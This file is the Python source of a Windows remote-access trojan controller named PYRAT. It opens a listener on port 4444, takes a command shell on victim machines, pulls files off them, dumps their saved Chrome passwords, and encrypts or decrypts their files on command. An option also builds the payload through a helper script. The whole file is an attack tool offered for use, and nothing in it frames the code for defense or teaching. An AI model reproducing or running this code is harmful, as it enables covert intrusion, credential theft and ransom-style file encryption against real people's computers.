import socket
import os
import sys
import time
import argparse
import subprocess

class setConfig:
	def __init__(self, localhost, localport=4444):
		try:
			self.LHOST = localhost
			self.LPORT = int(localport)
			self.exploit = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			self.exploit.bind((self.LHOST, self.LPORT))
			self.exploit.listen(5)
		except KeyboardInterrupt:
			print("\n[!] Interrupt. Exiting ...!!")
			self.exploit.close()
			sys.exit()

class ExploitAdministration(setConfig):
	def run_handler(self):
		try:
			print("\n[*] Listening connection as server {}:{} ...".format(self.LHOST, self.LPORT))
			self.received, self.fromAddress = self.exploit.accept()
			print("[*] Connection estabilished with {h}:{p}".format(h=self.fromAddress[0], p=str(self.fromAddress[1])))
			self.systemOS = self.received.recv(1024).decode()
			time.sleep(1)
			print("[*] Running on system target -> {system}".format(system=self.systemOS))
			print(
				"[*] Command shell session opened ({h}:{p} -> {h_t}:{p_t})\n".format(
						h=self.LHOST,
						p=self.LPORT,
						h_t=self.fromAddress[0],
						p_t=str(self.fromAddress[1])
					)
				)
			time.sleep(2)
			while True:
				try:
					shell = str(input("\033[04mshell\033[0m >> "))

					if shell.startswith("download") == True:
						try:
							print("\n[+] Downloading file ...")
							file_name = shell.split()[1]
							self.received.send(shell.encode('utf-8'))
							with open(file_name, "wb") as fn:
								read_data = self.received.recv(1024).decode()
								while True:
									fn.write(read_data)
									read_data = self.received.recv(1024).decode()
									if read_data == "DONE":
										break
							print("[+] Downloaded to complete.")
						except IndexError:
							print("Usage: download [filename]")
							
					elif shell == "dump_chrome":
						print("\n[+] Dumping password on chrome target ...")
						time.sleep(2)
						self.received.send("dump_chrome".encode('utf-8'))
						self.data_dump = self.received.recv(4096).decode()
						with open("dump_chrome.txt", "w") as filepassword:
							filepassword.write(self.data_dump)
							filepassword.close()
						print("[+] Completed successfully!\n")

					elif shell.startswith("encrypt") == True:
						try:
							fileTarget = shell.split()[1]
							key = shell.split()[2]
							print("\n[+] Encrypting file -> {}".format(fileTarget))
							self.received.send("encrypt {} {}".format(fileTarget, key).encode('utf-8'))
							print("[+] Encrypted successfully!\n")
						except IndexError:
							print("Usage: encrypt [file] [key]") 

					elif shell.startswith("decrypt") == True:
						try:
							fileTargets = shell.split()[1]
							keys = shell.split()[2]
							print("\n[+] Decrypting file -> {}".format(fileTargets))
							self.received.send("decrypt {} {}".format(fileTargets, keys).encode('utf-8'))
							print("[+] Decrypted successfully!\n")
						except IndexError:
							print("Usage: decrypt [file] [key]")

					elif shell == "quit":
						self.received.send("quit")
						respon = self.received.recv(4096).decode()
						print("\n[!] {data_response}".format(data_response=respon))
						self.received.close()

					elif shell == None:
						print("\n[!] No send commands to exploit!!\n")

					else:
						self.received.send(shell.encode('utf-8'))
						self.data_receive = self.received.recv(4096).decode()
						print(str(self.data_receive))
				except KeyboardInterrupt:
					self.received.close()
					print("\n[!] Close connection!!")
					sys.exit()

		except KeyboardInterrupt:
			print("\n[!] Interrupt. Exiting ...!!")
			self.exploit.close()
			sys.exit()

		except socket.error as SOCKET_ERROR:
			print(str("\n[!] {}".format(SOCKET_ERROR)))
			sys.exit(0)
			

if __name__ == "__main__":

	def banner():
		logo = """
	 ____  _  _  ____   __  ____
	(  _ \( \/ )(  _ \ / _\(_  _)
	 ) __/ )  /  )   //    \ )(
	(__)  (__/  (__\_)\_/\_/(__) v1.0 (ReztDev)

	Python Remote Administration Tools
	"""
		return logo

	print(banner())
	parser = argparse.ArgumentParser(
				description="Python Remote Administration Tools for Windows", 
				formatter_class=lambda prog: argparse.HelpFormatter(
					prog, max_help_position=70, width=100
				)
			)
	parser.add_argument("-s", "--server", dest="server", action="store_true", help="Server as listener handler")
	parser.add_argument("-e", "--exploit", dest="exploit", action="store_true", help="Start run exploit and create payload code")
	parser.add_argument("-t", "--host", dest="host", help="Specify lhost as listener")
	parser.add_argument("-p", "--port", dest="port", type=int, help="Specify port for listener")
	parser.add_argument("-w", "--write", dest="output", help="Specify file output payloads (need opt : -e / --exploit)")
	parser.add_argument("-v", "--version", dest="version", action='store_true', help="Show version info")
	args = parser.parse_args()

	if args.server:
		run = ExploitAdministration(args.host, args.port)
		run.run_handler()

	elif args.exploit:
		run = ExploitAdministration(args.host, args.port)
		if os.name == "nt":
			subprocess.Popen([sys.executable, "bin/FileExe.py", args.host, str(args.port), args.output], creationflags=subprocess.CREATE_NEW_CONSOLE)
			run.run_handler()
		else:
			subprocess.Popen(sys.executable + "bin/FileExe.py", args.host, str(args.port))
			run.run_handler()

	elif args.version:
		print("\tVersion " + sys.argv[0] + " 1.0")
		print("\tCopyright (c) 2019. All right reserved")

	else:
		print("Try: " + sys.argv[0] + " -h/--help for more informations!!")
		sys.exit()
